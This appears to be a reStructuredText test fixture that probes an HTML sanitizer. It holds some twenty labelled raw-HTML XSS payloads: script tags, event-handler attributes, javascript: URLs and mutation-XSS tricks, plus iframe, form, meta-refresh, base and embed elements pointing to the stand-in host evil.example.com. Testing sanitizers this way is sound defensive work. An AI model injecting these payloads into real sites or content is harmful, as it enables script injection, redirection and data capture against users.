RAW HTML sanitizer probe
========================

CANARY-RAWPROBE-START

MARKER-SCRIPT

.. raw:: html

   <script>alert(1)</script>

MARKER-IMG-ONERROR

.. raw:: html

   <img src=x onerror=alert(1)>

MARKER-SVG-ONLOAD

.. raw:: html

   <svg onload=alert(1)></svg>

MARKER-A-JS

.. raw:: html

   <a href="javascript:alert(1)">jsurl</a>

MARKER-IFRAME

.. raw:: html

   <iframe src="https://evil.example.com/"></iframe>

MARKER-DETAILS

.. raw:: html

   <details open ontoggle=alert(1)>x</details>

MARKER-FORM-INPUT

.. raw:: html

   <form action="https://evil.example.com/"><input name=p><button>go</button></form>

MARKER-OBJECT

.. raw:: html

   <object data="https://evil.example.com/x"></object>

MARKER-EMBED

.. raw:: html

   <embed src="https://evil.example.com/x">

MARKER-META-REFRESH

.. raw:: html

   <meta http-equiv="refresh" content="0;url=https://evil.example.com/">

MARKER-BASE

.. raw:: html

   <base href="https://evil.example.com/">

MARKER-STYLE-TAG

.. raw:: html

   <style>body{background:red}</style>

MARKER-STYLE-ATTR

.. raw:: html

   <div style="background:url(javascript:alert(1))">styled</div>

MARKER-ONCLICK

.. raw:: html

   <div onclick=alert(1)>clickme</div>

MARKER-MXSS-SVG

.. raw:: html

   <svg><style><!--</style><img src=x onerror=alert(1)>--></svg>

MARKER-NOSCRIPT

.. raw:: html

   <noscript><p title="</noscript><img src=x onerror=alert(1)>">

MARKER-TEMPLATE

.. raw:: html

   <template><img src=x onerror=alert(1)></template>

MARKER-MATH

.. raw:: html

   <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

MARKER-LINK-IMPORT

.. raw:: html

   <link rel="stylesheet" href="https://evil.example.com/x.css">

MARKER-ANCHOR-TARGET

.. raw:: html

   <a href="https://evil.example.com/" target="_blank">ext</a>

CANARY-RAWPROBE-END
